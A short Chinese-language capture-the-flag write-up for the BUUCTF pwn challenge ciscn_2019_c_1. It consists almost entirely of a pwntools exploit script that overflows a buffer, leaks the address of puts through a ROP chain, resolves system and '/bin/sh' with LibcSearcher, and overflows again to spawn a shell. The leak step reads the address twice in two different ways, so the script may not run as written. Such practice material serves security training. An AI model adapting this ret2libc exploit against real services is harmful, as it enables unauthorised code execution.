# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#ciscn_2019_c_1)

checksec



# exp

```python

from pwn import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
#p = remote('node5.buuoj.cn',28352)
p = process('./ciscn_2019_c_1')
elf = ELF('./ciscn_2019_c_1')
#libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
#gdb.attach(p)

pop_rdi=0x400c83
ret_addr=0x4006b9
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']
#第一次溢出，ROP出puts的真实地址
p.sendlineafter('choice!\n',b'1')
payload = flat(b'\0','A'*0x57,p64(pop_rdi),p64(puts_got),p64(puts_plt),(main_addr))
p.sendlineafter('encrypted\n',payload)
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) #接收puts地址
puts_addr=u64(p.recvuntil('\n')[:-1].ljust(8,b'\x00'))
########本地libc找地址#########
#libc_put = libc.sym['puts']
#base = puts_addr-libc_put
#libc_system = libc.sym['system']
#system_addr = libc_system
#libc_bin = 0x19604F
#bin_sh = base +libc_bin


#利用LibcSearcher找到地址
libc = LibcSearcher('puts',puts_addr)
base = puts_addr - libc.dump('puts') #基地址
system_addr = base+libc.dump('system')
bin_sh = base+libc.dump('str_bin_sh')

#二次溢出，取shell
p.sendlineafter('choice!\n',b'1')
payload2 = flat(b'\0',b'A'*0x57,p64(ret_addr),p64(pop_rdi),p64(bin_sh),p64(system_addr))
p.sendlineafter('encrypted\n',payload2)
p.interactive()
```

